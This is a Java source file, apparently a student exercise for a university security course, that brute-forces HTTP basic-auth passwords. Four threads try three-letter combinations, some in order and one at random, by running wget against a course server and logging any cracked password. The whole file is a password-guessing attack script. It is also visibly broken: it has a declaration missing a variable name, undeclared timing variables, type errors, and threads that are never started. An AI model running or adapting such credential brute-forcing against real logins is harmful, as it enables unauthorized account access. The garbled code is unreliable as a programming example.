








import java.io.*;
import java.util.*;


class BruteForce {


public static void main(String args[]){


RandomThread ran = new RandomThread();
MixThread mix = new MixThread();
SmallLetterThread  = new SmallLetterThread();
CapLetterThread caps = new CapLetterThread();


mix.get();
ran.get();

caps.get();

                                      }

                }


class MixThread extends Thread {

String pass,s;
char a,b,c;
int z=0;
int attempt=0;
Process p;
char pas[]=new char[4];

char pos[]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q',
            'R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h',
            'i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
 int time = System.currentTimeMillis();
public void run ()
{
for(int i=0;i<pos.length;i++){
 for(int j=0;j<pos.length;j++){
  for(int k=0;k<pos.length;k++){
      pass=String.valueOf(pos[i])+String.valueOf(pos[j])+String.valueOf(pos[k]);

     try {
          System.out.println("Trying  crack using: "+pass);
          attempt++;

          p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
          try{
          p.waitFor();
         }
      catch(Exception q){}


          z = p.exitValue();


      if(z==0)
      {
       stop = System.currentTimeMillis();
      float duration = stop - start;
      BufferedWriter out=new BufferedWriter(new FileWriter("out.txt",true));
      out.write("\n");
      out.write(" BRUTE FORCE ATTACK ---- Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts in " + duration + " milliseconds " );
      out.close();
      System.out.println(" Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
      System.exit(0);
      }




      
       }
     catch (IOException e) {
        System.out.println("exception happened - here's what I know: ");
        e.printStackTrace();
        System.exit(-1);
                           }

        }
       }
      }
    }
  }



class RandomThread extends Thread {

String pass,s;
char a,b,c;
int z=0;
int attempt=0;
Process p;
char pas[]=new char[4];
char pos[]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q',
             'R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h',
             'i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
 int time = System.currentTimeMillis();
public void run ()
{
for(; ;)
{
    Random generator1= new Random();
    int m= generator1.nextInt(52);
    int n= generator1.nextInt(52);
    int o= generator1.nextInt(52);

    pass=String.valueOf(pos[m])+String.valueOf(pos[n])+String.valueOf(pos[o]);
    try {
        System.out.println("Trying  crack using: "+pass);
        attempt++;

     p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
     try{
         p.waitFor();
         }
     catch(Exception q){}


     z = p.exitValue();


     if(z==0)
     {       stop = System.currentTimeMillis();
            float duration = stop - start;
            BufferedWriter out=new BufferedWriter(new FileWriter("out.txt",true));
            out.write("\n");
            out.write(" BRUTE FORCE ATTACK ---- Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
            out.close();
            System.out.println(" Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
            System.exit(0);
      }





     
      }
      catch (IOException e) {
      System.out.println("exception happened - here's what I know: ");
      e.printStackTrace();
      System.exit(-1);
                            }
                    }
           }
 }



class CapLetterThread extends Thread {

String pass,s;
char a,b,c;
int z=0;
int attempt=0;
Process p;
char pas[]=new char[4];
char pos[]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q',
             'R','S','T','U','V','W','X','Y','Z'};
int time = System.currentTimeMillis();
public void run ()
{
for(int i=0;i<pos.length;i++){
 for(int j=0;j<pos.length;j++){
  for(int k=0;k<pos.length;k++){
    pass=String.valueOf(pos[i])+String.valueOf(pos[j])+String.valueOf(pos[k]);

    try {
        System.out.println("Trying  crack using: "+pass);
        attempt++;

        p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
        try{
            p.waitFor();
            }
        catch(Exception q){}


         z = p.exitValue();


         if(z==0)
         {
            stop = System.currentTimeMillis();
           float duration = stop - start;
           BufferedWriter out=new BufferedWriter(new FileWriter("out.txt",true));
           out.write("\n");
           out.write(" BRUTE FORCE ATTACK ----Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
           out.close();
           System.out.println("Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
           System.exit(0);
          }




   
         }
        catch (IOException e) {
            System.out.println("exception happened - here's what I know: ");
            e.printStackTrace();
            System.exit(-1);
         }

        }
      }
    }
  }
}



class SmallLetterThread extends Thread {

String pass,s;
char a,b,c;
int z=0;
int attempt=0;
Process p;
char pas[]=new char[4];
char pos[]={'a','b','c','d','e','f','g','h',
             'i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
 int time = System.currentTimeMillis();
public void run ()
{
for(int i=0;i<pos.length;i++){
 for(int j=0;j<pos.length;j++) {
  for(int k=0;k<pos.length;k++) {
    pass=String.valueOf(pos[i])+String.valueOf(pos[j])+String.valueOf(pos[k]);
   try {
        System.out.println("Trying  crack using: "+pass);
        attempt++;

       p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
       try{
       p.waitFor();
          }
       catch(Exception q){}

        z = p.exitValue();


        if(z==0)
        {
          stop = System.currentTimeMillis();
         float duration = stop - start;
         BufferedWriter out=new BufferedWriter(new FileWriter("out.txt",true));
         out.write("\n");
         out.write(" BRUTE FORCE ATTACK ----Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
         out.close();
         System.out.println("Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
         System.exit(0);
         }



        
        }
        catch (IOException e) {
          System.out.println("exception happened - here's what I know: ");
          e.printStackTrace();
          System.exit(-1);
          }

        }
      }
    }
  }
}


